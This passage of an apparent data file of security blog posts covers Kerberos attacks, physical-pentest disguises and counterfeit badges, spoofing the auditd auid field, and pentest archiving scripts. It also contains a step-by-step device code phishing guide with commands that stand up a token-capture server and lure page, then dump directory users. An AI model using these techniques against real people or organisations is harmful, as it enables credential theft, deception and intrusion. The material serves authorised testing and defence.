Angel)  \n\nKerberos & Attacks 101 \u2013 Tim Medin \n\n https://youtu.be/IBeUz7zMN24\n\nWho better to learn from than the creator of Kerberoasting himself? Tim Medin explains Microsoft\u2019s authentication protocol, Kerberos, and how it works (I always forget). Understanding the different methods of attacking Kerberos will be essential on internal pentests. Kerberoasting, Pass-The-Ticket, Over-Pass-The-Hash, Extract and Crack, and other methods are discussed.  \n\nThings NOT to Do in Pentest Reports: Tips, Tricks, and Traps in Report Writing \u2013 Bronwen Aker \n\nhttps://youtu.be/eWNqaFf60fg\n\nLove it or hate it, the pentest report is what people are paying for. Bronwen has been writing and editing BHIS reports for years and put together this presentation to help you avoid common mistakes.  \n\nFinal Thoughts \n\nThese videos cover a wide range of topics to help anyone expand their knowledge. I believe whether you are just starting out or a seasoned tester, you will be able to take away some new pieces of knowledge. I look forward to expanding this list in the future. If you would like to be notified of future webcasts so you can attend live and ask questions, you can sign up for our mailing list: https://www.blackhillsinfosec.com/sign-up/ \n\nGood luck and happy hacking! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"If You Don't Ruse, You Lose: A Simple Guide to Blending in While Breaking In\"\nTaxonomies: \"Informational, Joseph Kingstone, Physical, Red Team\"\nCreation Date: \"Thu, 20 Apr 2023 16:30:00 +0000\"\nJoseph Kingstone //\n\nAre you assigned a physical penetration test and want to fly under the radar and meet all of your objectives like the elite hacker you are? Stick around and let's go over a few things that might help you blend in or stay undetected. \n\nWhat is a Ruse? \n\nWhat is a ruse exactly? A ruse is a method used to outwit someone by deceiving them. A ruse may involve a deceptive plan, statement, or device used. The context we are using here is based on what you wear and how you appear. \n\nOSINT \n\nThe best ruse might be the one you research. Look for these things: \n\nLocal College or Pro Teams: \n\nWhat city or state is the assessment taking place? Get an idea of a subject that you could brush up on and talk about. Sports are a great icebreaker. \n\nCompany ID Cards: \n\nCheck a company's social media. Figure out what ID cards look like and try to replicate one yourself using a Canon IVY or similar.\n\nCompany Events: \n\nThrough a company's site or social media, try to find picnics, unveiling ceremonies, fundraisers, or even softball games. These are all events you could find badges to replicate, clone, or tailgate your way in among the madness for easy access. \n\nConstruction work \n\nConstruction sites for a company often do not have things in place such as network access control (NAC) or monitoring. If your goal is network access, this may be your golden ticket. \n\nLocations \n\nWhat locations did the customer give you to penetrate and what is your goal exactly? It is always helpful to research the locations you are assigned to and also other sites you may find. Try to identify what kind of access controls there are or dress code for those locations (datacenters may be more relaxed than corporate headquarters). If you have trouble meeting your objectives, have an idea of other locations that may help you reach your objectives if communicated with the customer. \n\nBadges \n\nIf you have seen any badges posted publicly from your adventures in OSINT above, try to replicate it. Also, try to mimic the badge placement on-site for your physical penetration test. Even if you aren't able to clone or get legitimate badge access, a well-made counterfeit badge might let you tailgate right behind an actual employee. \n\nPretext \n\nSecurity conscious employees got you down? Pretext may help. What is pretext? In this context, it's as simple as having a story about why you are somewhere or even why you need to be somewhere. If you are in a networking closet, have a story about router upgrades. If you are in someone's office after hours, you are fulfilling some janitorial duties. Matching your pretext with your ruse is recommended. \n\nUtility Worker \n\nThe utility worker ruse is a fairly common ruse among penetration testers who perform physical security engagements. It's not unusual to have a few industrial maintenance employees around keeping the facility running the way it should. Unfortunately, this ruse is also being seen by criminals who burglarize and steal packages off porches.\n\nSecurity Guard \n\nPosing as a security guard is also a good ruse to work with. A few caveats: don't act like a cop, you might have a bad time. Security guard ruses can work just fine; do some due diligence if you can. See if there are already security guards there. If there are, you might want to find an alternative ruse. \n\nIT Worker \n\nIT workers are never a bad idea. You can dress normally and have less eyes on you as opposed to a security guard or having people wonder what kind of work you are doing in your utility jacket and hard hat. An added bonus is that IT workers can slide right by with all your lockpicks, traveler hooks, tensioners, and drop boxes inside of a typical laptop case or backpack. \n\nPregnancy Ruse \n\nLast but not least, a pregnancy ruse could also help you get into many places. People are often extra helpful in this situation. Although faux pregnancy bellies are not cheap, they are effective. \n\nHopefully this gives you a few simple ideas to use or expand upon during your next physical security assessment. \n\nCheck out another blog by Joseph about physical pentests: Tales From the Pick: Intro to Physical Security Tools\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Auditd Field Spoofing: Now You Auditd Me, Now You Auditdont\"\nTaxonomies: \"Informational, Linux, moth, Auditd, C, evasion\"\nCreation Date: \"Thu, 11 May 2023 14:30:00 +0000\"\nmoth //\n\nIntroduction \n\nOne fateful night in June of 2022, Ethan sent a message to the crew: \"Anyone know ways to fool Auditd on Linux? I'm trying to figure out how to change the auid (audit user id) field. This field remains the same even if you use su or sudo (there are other user id fields that track these changes).\" \n\nEthan also helpfully sent a reference link to describe what he was looking at. \n\nNow, do I know Auditd well enough to warrant looking into this myself? No. Am I a big enough fan of Linux (and a big enough fool) to throw my hat in the ring anyway? Most definitely. \n\nSo, what was Ethan's original goal here? In short, the SOC team was working on building a \"canary\" script for spoofing a given auid as well as determining whether the auid value is a reliable source of truth when writing detections for Linux systems. If the auid field keeps track of users as they switch users (su) or run commands with elevated permissions (sudo), the ability to change this field could be potentially lucrative to attackers. \n\nPrimer\n\nWith that introduction out of the way, we're ready to start researching. First things first, what is the auid field, how is it accessed, and \u2014 crucially \u2014 how can it be modified?  \n\nFrom reading the documentation link that Ethan posted, it would seem that the auid field is derived from the uid (user identifier) field and is meant to remain consistent across a process's children, even if the uid of the child process is modified. For context, a uid of 0 represents the root user, uid values under 1000 are typically system accounts, and uid values from 1000 onward represent standard user accounts. The etc/passwd file contains the mapping between uids and usernames. This information can also be viewed with the getent passwd command.\n\nNow, we get to do something that I Iove having an excuse to do: looking at kernel code. To do so, I'll be using elixir.bootlin.com to browse the kernel source code. First, let's look for where the auid field is used, what initially sets it, and where it may be changed. From the search results, the auid field is logged starting on line 1600 (as of kernel version 6.0.19) of /kernel/audit.c. The auid field is retrieved with a function call, audit_getloginuid(current). \n\nLocation of \"auid\" Field in Audit Logging\n\nNow that we know how the auid field is retrieved by logging services, let's look for the audit_get_loginuid function. The function is defined and implemented in the audit header file, at /include/linux/audit.h. From the function implementation starting on line 199, the function accepts a pointer to a task structure (task_struct) and returns a field called loginuid from it. \n\nContents of \"audit_get_loginuid\" Function\n\nWe\u2019re getting closer to the bottom now, so it\u2019s time to find that field in the task structure definition. The task structure can be found in /include/linux/sched.h and is used to contain process information. The loginuid field is defined as a structure field, but only if CONFIG_AUDIT is defined, which makes sense \u2014 we don't need the loginuid field (or related fields) if the system isn't configured for auditing. \n\nAudit-Specific \"loginuid\" Task Structure Field\n\nFrom here, I began formulating ways that we could write to this field. Kernel patching and even a loadable kernel module felt a little too hardcore given the context of this task, so I figured it was worth trying to tackle the problem from userspace. Unfortunately, that marks the end of the kernel source spelunking portion of this adventure. Please remember to fill out the tour guide review survey. \n\nAfter gaining some insight into the auid field, I set out to find a way to modify it. I eventually landed on a GitHub commit detailing how (and under what conditions) the field can be modified. \n\nAuditd Commit Detailing Login UID Mutability\n\nPutting everything together from that commit, the current process's auid field should be mutable via /proc/self/loginuid as long as permissions are valid, the CAP_AUDIT_CONTROL Linux capability is set, and the AUDIT_FEATURE_LOGINUID_IMMUTABLE and AUDIT_FEATURE_ONLY_UNSET_LOGINUID kernel configuration options are not set. With all of that information, we should be ready to start tackling the problem. \n\nNow You Auditd Me \n\nThe initial kernel exploration was illuminating, but overall lacking in context. To get some context, let's take a look at how audit entries are logged. Note that the contents shown below have been slightly modified to omit unrelated surrounding log entries in order to make the output cleaner and easier to follow. \n\nLog file information can be found in /var/log/audit/audit.log (at least on RHEL systems). I first run sudo ls followed by a command to print the last six lines from the log file. Note that the executable logged is /usr/bin/sudo and the relevant command is ls, which makes sense given what we just ran. \n\nSudo Usage Logged with Consistent UID and AUID \n\nSo now, what gets logged when we run sudo su? Well, as we might expect, the audit log shows an entry for the command execution. A few entries down, we see that the uid field has updated to 0 (root), but the auid field remains the same as the original user. \n\nSudo Usage Logged with Changed UID and Consistent AUID \n\nAnd here, we arrive at the task: A simple program that, assuming we have sudo permissions, allows us to manually set the auid field via the /proc/$pid/loginuid pseudofile. \n\nNow You Auditdon't \n\nNow that we have our task well and truly researched, let's start with the easy ideas first. If we can write to the pseudofile, do we even need to program anything? As much as I love throwing code at a problem, this wasn't my problem to begin with, so I'll be proceeding with a bit of care (for once). \n\nThe Easy Way? \n\nFirst, what happens if we write to the file directly? We should have requisite permissions to write to our own process, right? \n\nWrite Operation Not Permitted\n\nApparently not. Granted this isn't a permission denied error, which would indicate an access error. Let's shelve that for now. What if we echo the new value and then write that content to the file as sudo? \n\nUnsuccessful Write Attempt\n\nNo error that time, but still no dice. \n\nYet Another Unsuccessful Write Attempt \n\nQuick sidebar: You might be wondering if /proc/self is reliable when different processes are spawned per most commands and per user context when using sudo. I can say that, from testing, the behavior was the same when using the specific PID of the current terminal. \n\nWhat's even more interesting is that the root user can modify its own loginuid files, but not those owned by other user processes. Ethan also confirmed that attempting to give cat or tee the CAP_AUDIT_CONTROL capability did not work any better. All of this indicates that I'm going to get to throw code at the problem after all. \n\nWith that, it's finally time to start slinging some code. Here's a fun \"drinking game\" for this next section: take a little tiny sip of water every time you read the words \"capability\" or \"capabilities\" to make sure you stay well hydrated... \n\nThe Hard Fun Way! \n\nQuick aside before we get coding: You need to make sure that the libcap-dev (Debian) or libcap-devel (RHEL) package is installed on your system before continuing, otherwise a requisite header file will not exist. \n\nOutside of some preliminary argument validation, the code I came up with largely boils down to the following five primary components, several of which are mainly just error detection and short-circuiting if something goes wonky on us: \n\nGet process capabilities, make sure CAP_AUDIT_CONTROL is supported. \n\nSet process capabilities to enable the CAP_AUDIT_CONTROL capability. \n\nWrite new auid field to /proc/self/loginuid pseudofile. \n\nVerify that new auid field was written properly. \n\nSpawn shell. \n\nGiven that we require specific capabilities to modify the auid field, the first step is to retrieve our process capabilities and also determine whether the CAP_AUDIT_CONTROL capability is enabled in our process. How do we accomplish this? Without an immediate familiarity of programming with capabilities, I ran apropos capability in my terminal and received a handful of results. \n\nSearching for Relevant Manual Pages \n\nChecking the manual page for one of the results, it appears that most of them point to the header file sys/capabilities.h. The \"see also\" section of the page for cap_clear includes a reference to cap_get_proc, which is the function I ultimately ended up using to retrieve the process capabilities. It is crucial to note here that including sys/capabilities.h requires that the code be compiled with -lcaps so it links against the capabilities library. \n\nNow that we know what to use to retrieve our process capabilities, it would be useful to check whether the CAP_AUDIT_CONTROL capability is supported on my system. Conveniently, the manual page for cap_get_proc includes a macro predictably named CAP_IS_SUPPORTED. The manual page describes it as follows: \"CAP_IS_SUPPORTED(cap_value_t cap) is provided that evaluates to true (1) if the system supports the specified capability, cap. If the system does not support the capability, this function returns 0.\" \n\nWith those pieces of information at our disposal, we can construct the first main chunk of the program: store the process capabilities in a variable named caps and check for CAP_AUDIT_CONTROL support. \n\nSegment 1 - Capability Retrieval and Enumeration\n\nAt this point in the code, we now have good confidence that the required capability is at least supported on the system. The next step involves us creating a new capability list containing CAP_AUDIT_CONTROL, using the cap_set_flag() function to enable it, and then writing the updated capabilities to the process using the cap_set_proc() function. \n\nSegment 2 - Capability Construction and Writing \n\nWith our capabilities written, it's time to get and write the new auid value to /proc/self/loginuid. To do so, we use standard file I/O functions to open the file and write our first and only command argument to the file. \n\nSegment 3 - File Opening and New AUID Writing \n\nYou may have noticed that we didn't close the file used in the previous segment. That's because the next segment involves reading back the new value from the file to make sure things were written successfully. This step isn't strictly required but given how much trouble we were running into trying to modify the value without code, I figured better safe than sorry. Once we validate that the value was properly set, we close the file and release any memory allocated for the caps variable using the cap_free() function. \n\nSegment 4 - File Content Validation and Memory Management \n\nFinally, we spawn a simple /bin/bash shell using the execve() function. Nothing glamorous or especially safe, but it gets the job done. \n\nSegment 5 - Shell Spawning\n\nThat's pretty much all there is to the code. You get all that? Good. \n\nDemo \n\nAfter compiling the code with gcc -lcaps capybara.c -o capybara, we can see that it's working by using it like so: \n\nSuccessful Modification of AUID Field \n\nAlright, that's fine and all, but updating the number as seen by a process is only the first half of our task here. What we're really here to do is change the value that gets logged to our audit file! \n\nAfter running the code one more time and running sudo whoami (for demonstration purposes), we can then output some of the contents of /var/log/audit/audit.log, with a cheeky little Perl regex for added flavor. Looking at the first of two highlighted audit log lines, we can see something that I failed to notice during my initial development of this with Ethan: There's an old-auid field! That field only appears to be present when the field is modified. On the second highlighted log file entry, we see that the whoami command was executed with the \"correct\" auid value of \"12345\", with no mention of the old auid value. \n\nParsed Auditd Log Entries Showing \"old-auid\" Field \n\nSo, there's a pathway available for analysts to detect Auditd tomfoolery: Check for a changing old-auid field to keep track of user IDs as they may be changing. That said, Ethan later mentioned to me that LOGIN events weren\u2019t being surfaced in this particular environment's SIEM, adding another wrinkle to the issue of log visibility. \n\nConclusion \n\nI suppose we should start wrapping this up with some parting thoughts. \n\nIn terms of detection, make sure your SIEM is receiving LOGIN events from Auditd so you can be aware of any tampering. In terms of possible remediation, note that the GitHub commit shown earlier also discusses configuration options named AUDIT_FEATURE_LOGINUID_IMMUTABLE and AUDIT_FEATURE_ONLY_UNSET_LOGINUID which prevent overwriting and unsetting of the auid field respectively. From an enterprise Linux standpoint, I would imagine those would be good configurations to enable. That being said, I've looked through configuration options on kernel versions as recent as Linux 6.1.3, and I was unable to find either of those configuration options in a cursory search. \n\nApparently, there are auditctl commands to set kernel immutability (-e 2) and regular loginuid immutability (--login-immutability), but I have so far been unsuccessful in getting either command to do anything to prevent this technique from working. \n\nAll told, this work doesn't represent much of a groundbreaking discovery but seemed to yield satisfactory results for Ethan and the rest of the SOC team. What's more, this should serve as a reason to be cautious when writing detections around the Auditd facility. Depending on how a given organization writes detections or monitors the audit information, an attacker could potentially leverage a similar strategy to effectively disappear from view in environments that aren't equipped to detect a changing auid value. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Dynamic Device Code Phishing\"\nTaxonomies: \"Blue Team, Incident Response, Informational, InfoSec 301, Phishing, Red Team, Social Engineering, Steve Borosh, Device Code, Microsoft\"\nCreation Date: \"Tue, 16 May 2023 19:55:14 +0000\"\nrvrsh3ll // \n\nIntroduction \n\nThis blog post is intended to give a light overview of device codes, access tokens, and refresh tokens. Here, I focus on the technical how-to for standing up and operating a Dynamic Device Code phishing campaign. I\u2019ll cover some key points during the attack flow so operators and defenders will better understand areas to key-in on to help avoid or detect, depending on your intent. \n\nCodes  \n\nTo better understand what a \u201cdevice code\u201d is, take into consideration when purchasing a new smart television. That television may come with apps installed such as Netflix or Hulu. Well, in order to use those applications, you need to sign in to your account. Now, we don\u2019t want to be mashing TV remote buttons all day trying to type out our 24-character password, do we?  \n\nNo, we do not. Enter device codes. By navigating to https://netflix.com/tv8, we\u2019re prompted to enter a code from the TV as seen below. \n\nOnce the correct code is entered on the computer, the TV is signed in. The same premise applies to device code phishing. We, as the attacker, generate the code to give the user. That code is for https://microsoft.com/devicelogin as seen below. \n\nWhen the user signs in with the code, we receive the credentials package which includes access and refresh tokens. \n\nTokens \n\nAccess tokens or \u201caccess_tokens\u201d are exactly what they sound like. They are JSON web tokens that allow users to securely access Microsoft endpoints such as MSGraph. More detailed documentation on access_tokens may be found at https://learn.microsoft.com/en-us/azure/active-directory/develop/access-tokens. Access tokens are typically good for 1 hour. \n\nRefresh tokens or \u201crefresh_tokens\u201d allow users to refresh their access_token for up to 90 days. A great way to stay entrenched in a target environment. \n\nTokenTactics \n\nTokenTactics is a PowerShell module for generating device codes and refreshing refresh tokens created by Bobby Cooke @0xBoku and myself. Token tactics\u2019 main feature is the ability to refresh tokens to different audiences. Say, for example, you phished a user and received an MSGraph token. If you wanted to use that access to read the user\u2019s email, you can refresh that token to the Outlook audience endpoint, which, gives you an access_token for Outlook. The token can be played in a POST request via BurpSuite to gain access to Outlook in the browser. That\u2019s just one example. TokenTactics can be used to generate the device codes that you would send to the target user. \n\nOG Device Code Phishing \n\nDevice code phishing started with offensive operators having to generate the code in PowerShell and send it to the target user via email or other means. One major downside to this is that device codes have a timeout window of 15 minutes. That\u2019s a very restrictive time frame to work with on a phishing engagement. What if the target user doesn\u2019t see your phish within that timeframe? Well, as the phisher, you\u2019re out of luck. We need a better option. \n\nDynamic Device Code Phishing \n\nIn order to enhance our chances for phishing success, we need to extend that 15-minute window of opportunity during the phishing campaign. To do so, I use Azure Web Apps to deploy a static HTML page to an \u201c.azurewebsite.net\u201d site. This site is merely a front while JavaScript performs a GET request to the device code API, presents the user with the code, and sends a \u201ccapturecode\u201d to us, the attacker, so that when the target user signs in, we receive the token package on a virtual private server running TokenTactics.  \n\nThis method extends our window of opportunity as the user\u2019s actions generate the device code by browsing to the site. Then, our 15-minute timeout window begins. Since the user has visited the site, there\u2019s a chance they\u2019ll continue to login during that window. \n\nTo better understand this flow, I\u2019ve created a diagram. \n\nHere are some key points to the diagram: \n\nSource IP is always where the device code was generated. \n\n15 minutes start when visiting the azurewebsite. \n\nCORS-Anywhere is used to proxy headers back to the user\u2019s browser and render the code generation in-browser. https://github.com/Rob--W/cors-anywhere \n\nTokens are received on the captureserver.  \n\nHere\u2019s a quick demo video of it in action. \n\nDefenses \n\nI won\u2019t be diving into implementation of defenses in this blog post. However, here are some good starting points in Microsoft documentation and a tip that Conditional Access and Sign-on Protections should be implemented to alert or block users from signing in from unknown locations. Don\u2019t blindly allow iPhone or Android either because TokenTactics can spoof those devices. \n\nInitial Defenses \n\nInvestigate risk Azure Active Directory Identity Protection - Microsoft Entra | Microsoft Learn \n\nAzure AD Conditional Access \n\nAzure AD Identity Protection | Microsoft Security \n\nUsing networks and countries/regions in Azure Active Directory - Microsoft Entra | Microsoft Learn \n\nDeployment \n\nYou will first need to be signed in using the How to install the Azure CLI | Microsoft Learn. \n\nYou may sign in with az login \u2013use-device-code \n\nFrom a PowerShell terminal, clone TokenTactics. \n\ngit clone https://github.com/rvrsh3ll/TokenTactics \n\nClone Azure-App-Tools. \n\ngit clone https://github.com/rvrsh3ll/Azure-App-Tools  \n\nDeploy a capture server. \n\ncd TokenTactics/capturetokenphish \n\nimport-module .\\deploycaptureserver.ps1 \n\nInvoke-DeployCaptureServer -ResourceGroup YOURRESOURCEGROUP -location eastus -vmName codecapture -vmPublicDNSName msftdevicecodes -pubKey ./mykey.pub \n\nThis will deploy an Azure virtual machine, set the FQDN name, grab a LetsEncrypt certificate, and clone TokenTactics. \n\nSSH to your server. \n\nssh -i mykey azureuser@ \n\ncd TokenTactics \n\n*Keep this window open and start a new PowerShell terminal. \n\nDeploy a landing page. \n\ncd Azure-App-Tools/DynamicDeviceCodes \n\nOpen index.html with VSCode. \n\ncode index.html \n\nChange the \u201cMyCaptureServer\u201d to your Azure FQDN. Save. \n\nDeploy the site using a unique to the Internet \u201cYOURNEWSUBDOMAIN\u201d.  \n\naz webapp up --location eastus --resource-group YOURRESOURCEGROUP --name YOURNEWSUBDOMAIN --html --sku FREE \n\nYour website will deploy to https://YOURNEWSUBDOMAIN.azurewebsites.net. \n\nBack in your other PowerShell prompt you left open in TokenTactics in your SSH session, run your capture server.  \n\npython3 capturetokenphish.py -i 0.0.0.0 -p 8443 \n\nBrowse to your site to view the device code generation. \n\nThe script sends a device code that is generated with the user_code and is sent via \"GET /id?TOKEN\" request to the capture server. Once the server receives that string, PowerShell is loaded to invoke TokenTactics. \n\nAfter the user enters the device code, we should receive the access and refresh tokens and they will be saved to TokenLog.log. \n\nPost-Capture \n\nYou may parse your access_token received client-side at https://jwt.io or with Token Tactics\u2019 \u201cParse-JWTtoken\u201d cmdlet. This should give you important information such as the username for the token. \n\nTokens may be used with some of your favorite cloud enumeration and hacking tools listed below. For a quick win, dump all user email addresses with BARK. If your access is killed, at least you\u2019ll have a full list of users to spray or phish again. \n\ngit clone https://github.com/BloodHoundAD/BARK \n\ncd BARK \n\nImport-Module .\\Bark.ps1 \n\n$AllUsers = Get-AllAzureADUsers -Token -ShowProgress \n\nAlso, check out this great blog by TrustedSec on what to do with tokens. \n\nClosing \n\nIt\u2019s important to note that wherever the device code is generated, that IP address will show in the logs. Keep that in mind when avoiding or implementing conditional access policies. \n\nAlso, the authentication package brings MFA along with it. So, future code refreshes do not require MFA (currently). \n\nMicrosoft tokens are a powerful way to authenticate and access Azure and Microsoft 365 resources. Use the Microsoft tools available to prevent, detect, and respond to token abuse. I hope this blog post has helped defenders to better protect their network while providing offensive operators with another technique to test and enhance enterprise defenses. \n\nBlack Hills Information Security (BHIS) uses dynamic device code phishing, along with other techniques, against its continuous testing clients to assess phishing prevention, detection, and response capabilities tied to Azure Active Directory, Microsoft 365, and their associated security boundaries.\n\nBHIS has had mixed success with dynamic device code phishing. Some clients have detected the phish as \u201ccredential phishing\u201d. Some have had automated solutions detect the email vector and remove the email from inboxes. Others have strict conditional access policies that help mitigate this attack. There are key detection and prevention points in the attack chain as outlined in the blog. Still, we test the assumption of security. \n\nTrust and verify.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Six Tips for Managing Penetration Test Data\"\nTaxonomies: \"General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, John Malone, Archive, data, testing\"\nCreation Date: \"Thu, 25 May 2023 16:29:30 +0000\"\nJohn Malone //\n\nAn Archive IRL\n\nIntroduction\n\nInformation is power. This sentiment also holds true when discussing the creation of a supporting archive. A supporting archive is something that we put together to help inform our customers of our test findings and provide them the most relevant information. It should be a resource that contains evidence and artifacts from a penetration test that allows the tester to draw on information to further their attack strategy while simultaneously providing benefit to a customer so they may better enhance their security posture.\n\nIdeally, the security tester \u2014 you \u2014 will want to interact with the data and supporting archive in your terminal. Doing so will allow for rapid logging and interaction with content through the command line, which can prove exceptionally powerful when dealing with and searching through vast quantities of information.\n\nIn this post, we will briefly discuss how we may best manage our data and create a strong supporting archive.\n\nTip #1:  Dedicate Space for Your Data\n\nWhen working through a penetration test, you will want to first ensure that you have a place within your file system that is only for the data that will help you construct your supporting archive. Nothing else should be saved there with the exception of information that is directly relevant to your penetration test. For example, consider the following directory path:\n\n/home/tester/testing\n\nThis file path points to the \u201chome\u201d directory of the user \u201ctester\u201d and a subdirectory simply named \u201ctesting\u201d or the name of a customer.\n\nFigure 1: Your Archive Starts Here\n\nWhile it may seem like a mundane concept, dedicating a space to your testing data will help minimize the chances of contamination by irrelevant data and maximize the likelihood of your final product being easy to find and simple to navigate.\n\nAfter creating your dedicated folder, consider splitting it into additional subdirectories that further separate the contents based on what tools you will be using. You can certainly feel free to add more during your test, but laying things out and making them a standard part of any testing environment you use will save you time and will allow you to implement some time-saving scripting practices which will be discussed later. For example, we may have the following directories in our space:\n\n/home/tester/testing/nmap\n\n/home/tester/testing/gobuster\n\n/home/tester/testing/cryptography\n\n/home/tester/testing/eyewitness\n\n/home/tester/testing/impacket\n\n/home/tester/testing/recon\n\n/home/tester/testing/crackmapexec\n\nAn example is shown in the screenshot below.\n\nFigure 2: Supporting Archive Contents\n\nMy preferred naming convention for tests is:\n\n/home/malone/[CLIENT-NAME]/testing\n\nFeel free to use whatever naming convention you prefer.\n\nWith that established, we can carry this information with us to our next tip, which emphasizes the importance of understanding your tools so that you are able to extract the highest quality of information for your data.\n\nTip #2: Understand Command Syntax and Piping\n\nWhen working with testing tools, it is common to see tools that support outputting results to a specific file. For example, we can configure Nmap to run with the switches -oN for \u201cnormal output\u201d or -oX for \u201cXML output\u201d. While these methods often have their own unique case uses, for the intent of a thorough supporting archive, we would want to rely on -oN. The reason for this is that normal output is a simple text file that contains our information. Simplicity is a good thing and can allow us to use equally simple commands to extract meaningful information. Additionally, you could utilize the \u2013oA switch, depending on what you are looking for. This switch will provide you with normal, XML, and greppable output all at once! For this example, we will stick with \u2013oN.\n\nBelow is an example command that makes use of this feature.\n\nnmap -vvv -Pn -T4 -sV 192.168.1.1 -oN /home/tester/nmap/192.168.1.1.txt\n\nThis command instructs Nmap to provide very, very verbose output (-vvv), to treat all hosts as being alive (-Pn), to scan quickly (T4), to target an IP address, and to save the output of that IP address as normal output (-oN). By doing this, we are able to generate a text file that contains simple output and, most importantly, that is saved to our supporting archive at the designated location for this tool.\n\nFigure 3: Nmap Command In Action\n\nIt is worth noting that some tools, either by choice or by design oversight, may not always include tools for outputting their information. In this case, we can make use of the following command:\n\ntee -a /home/tester/testing/[TOOL]/[FILENAME]\n\nThis command, tee -a, allows us to append information to an arbitrary location within our computer system \u2014 or our supporting archive. This command is relatively useless in this format on its own but becomes a powerful logging tool when we combine it with our previous command. Even though Nmap supports logging, for the sake of this example, we can pretend that it does not and obtain the same result with the following command:\n\nnmap -vvv -Pn -T4 -sV 192.168.1.1 | tee -a /home/tester/testing/192.168.1.1-nmap.txt\n\nThis command will perform the same scan as the above Nmap command, but will now output the content directly to the desired file. We can utilize \u201ctee\u201d in this manner to ensure that we capture information quickly.\n\nTip #3: Supercharge Your Archive via Scripting\n\nWhen testing in a real-life environment, you may find yourself needing to engage in all sorts of activities which, when performed manually, would result in excessive amounts of consumed time. These activities, be they host discovery, enumeration, or even exploitation, can be made exceptionally easier with the use of BASH scripting in your terminal.\n\nWhen combined with the above tips, you can quickly weave together scripts which will not only perform your desired operation with the tool of your choice but will also construct a clean and complete area of your supporting archive. In my opinion, the best way to do this is with the use of \u201cfor loops\u201d.\n\nFor this example, we will utilize the same Nmap command as above, but will this time apply it to an entire range of hosts. We will also break the below command down into its individual components to ensure maximum clarity. Also, kindly take note of the bolded text.\n\nfor IP in $(cat /home/tester/testing/targets.txt); do nmap -vvv -Pn -T4 -sV $IP -oN /home/tester/testing/nmap/$IP.txt; done\n\nThis command, known as a \u201cfor loop\u201d, is named for the first word within the command \u2014 which is \u201cfor\u201d. Let\u2019s break this down into three parts.\n\nOur command begins with:\n\nfor IP in $(cat /home/tester/testing/targets.txt);\n\nHere, we are saying, \u201cHey computer, for each IP that we find on each line when we read targets.txt\u2026.\u201d.  This snippet is an argument that we are setting for the rest of our command, which comes after our semicolon. (More on that later.) Some who are savvy with Nmap may realize that a similar approach could be to simply feed Nmap a wordlist with the -iL switch and forgo the \u201cfor loop\u201d altogether. However, doing it this way will produce a single log file containing all scans. Using a \u201cfor loop\u201d will instead generate multiple log files for all IPs. This, as we will cover later, will allow you to extract data in a way that allows you to rapidly parse information belonging to each host.\n\nBefore we go on, it is important to note that IP is an arbitrary value. We could name this thing \u2014 which is a variable \u2014 whatever we want! We could call it \u201ci\u201d or \u201cblahblahblah\u201d or \u201cwhatever,\u201d and our results would be the same, provided we also reflect that on all other bolded text within our command. \n\nOur semicolon then tells our script that we will be providing another argument. This argument is:\n\ndo nmap -vvv -Pn -T4 -sV $IP -oN /home/tester/testing/nmap/$IP.txt;\n\nWhat we are now saying is, \u201cHey computer, for each IP that we find on each line when we read targets.txt, please DO this Nmap command and insert the value of the IP you are reading into each instance of $IP in our command.\u201d Our semicolon once again prepares the script for the last argument, which is simply:\n\ndone\n\nThis tells our loop to terminate after reading through our list in targets.txt. To bring the entire command full circle, you have now said, \u201cHey computer, for each IP that we find on each line when we read targets.txt, please DO this Nmap command and insert the value of the IP you are reading into each instance of $IP in our command.  Then quit!\u201d\n\nTo bring this all together, say our list of targets is:\n\n10.0.1.5\n\n10.0.1.7\n\n10.0.1.9\n\nAnd say we run the following script in our terminal:\n\nfor IP in $(cat /home/tester/testing/targets.txt); do nmap -vvv -Pn -T4 -sV $IP -oN /home/tester/testing/nmap/$IP.txt; done\n\nThis will perform the same instructions as the following three commands:\n\nnmap -vvv -Pn -T4 -sV 10.0.1.5 -oN /home/tester/nmap/10.0.1.5.txt\n\nnmap -vvv -Pn -T4 -sV 10.0.1.7 -oN /home/tester/nmap/10.0.1.7.txt\n\nnmap -vvv -Pn -T4 -sV 10.0.1.9 -oN /home/tester/nmap/10.0.1.9.txt\n\nGoing by what we have explored already, you can see that our BASH script will generate thorough logs for all targets within your targets.txt. However, we are saving ourselves a great deal of time, as our \u201cfor loop\u201d needs to only be entered once, leaving Nmap to scan our three, or our three hundred, or three thousand, hosts for us. This saves us time and ensures that our supporting archive contains the maximum amount of information.\n\nFigure 4: List of Nmap Logs Generated by a For Loop\n\nWhen turned into a habit, this practice will help ensure maximum efficiency and logging accuracy!\n\nTip #4:  Let Your Data Work for You\n\nNot to turn this into a programming class, but the data you will collect while testing becomes a rather powerful testing tool, provided you treat it with love and care and keep it organized! With that said, your archive can grow off of itself as long as you implement a clever scripting plan that allows it to do so.\n\nBy combining all of our previous tips, we now have:\n\nA dedicated workspace;\n\nAn understanding of our tooling;\n\nAn understanding of how to use our tooling with scripting to build out our archive.\n\nBy all means, we can completely end this article here and send you on your merry way, but we couldn\u2019t call ourselves hackers if we didn\u2019t think of clever ways to utilize the information we gain, could we?\n\nWith the above bullet points in mind, we can now use our archive in a way that allows it to further build on itself, thereby saving us even more time. This time, due to the nature of our work, can instead be put towards polishing that beautiful penetration test report or engaging in manual testing while your tools chug away and your archive builds itself.\n\nFor this example, I have drafted a script that follows the following steps:\n\nDiscover hosts that are alive within a given scope and generate a list of targets.\n\nUse the list of targets to conduct a port scan and save the results to the archive.\n\nUse the port scan results to produce a report for webservers that is stored in the archive.\n\nUse the port scan results to enumerate cryptography for all webservers and, you probably guessed it, store the results within your archive.\n\nAs a challenge, consider the above tips while you review the code to look for the rhyme and rhythm behind what the tool is doing.  \n\nAlso, small disclaimer: This script is nowhere near perfect. However, I do feel that it illustrates the concepts discussed in this posting well enough and is applicable to help build out a starting point for an archive. Feel free to steal this and use/modify it to your heart\u2019s content. And most importantly \u2014 be creative in your own scripting efforts!\n\n#/bin/bash\n\n#Make sure we have our IP ranges stored in CIDR format in /home/tester/testing/range.txt before we launch this script or it won\u2019t work!#\n\n#Build our Archive#\n\nmkdir /home/tester/testing\n\nmkdir /home/tester/testing/nmap\n\nmkdir /home/tester/testing/eyewitness\n\nmkdir /home/tester/testing/cryptography\n\n#Generate a list of living hosts from text file containing CIDR ranges in our pen test 